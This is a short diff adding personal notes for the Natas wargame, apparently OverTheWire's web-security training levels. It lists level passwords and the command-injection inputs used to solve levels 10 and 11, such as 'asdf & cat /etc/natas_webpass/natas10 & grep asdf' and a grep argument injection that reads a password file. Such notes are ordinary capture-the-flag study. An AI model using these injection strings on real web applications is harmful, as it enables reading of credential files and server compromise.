@@ -20,4 +20,22 @@ Natas 9:
 W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 
 Natas 10:
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+asdf & ls -a & grep asdf
+.
+..
+.htaccess
+.htpasswd
+dictionary.txt
+index-source.html
+index.php
+index.php.tmpl
 
+asdf & cat /etc/natas_webpass/natas10 & grep asdf
+etc/natas_webpass/ is where passwords are stored
+
+Natas 11:
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+-v asdf /etc/natas_webpass/natas11
+
+Natas 12:
